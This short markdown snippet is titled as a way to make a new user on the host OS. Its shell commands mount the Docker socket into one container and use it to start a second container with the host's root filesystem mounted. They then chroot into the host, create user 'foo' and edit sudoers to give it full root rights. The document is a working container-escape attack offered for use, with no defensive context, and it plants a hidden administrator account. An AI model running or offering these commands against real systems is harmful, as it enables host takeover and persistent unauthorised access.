# Make new user "foo" on Host OS!  

```sh
# run containerA
docker run -it -v /var/run/docker.sock:/var/run/docker.sock docker /bin/sh
# run containerB on containerA
docker run -it -v /:/hostroot debian /bin/sh
whoami
chroot /hostroot
useradd foo
cat /etc/passwd | grep foo
visudo  # add new line "foo ALL=(ALL)"
```
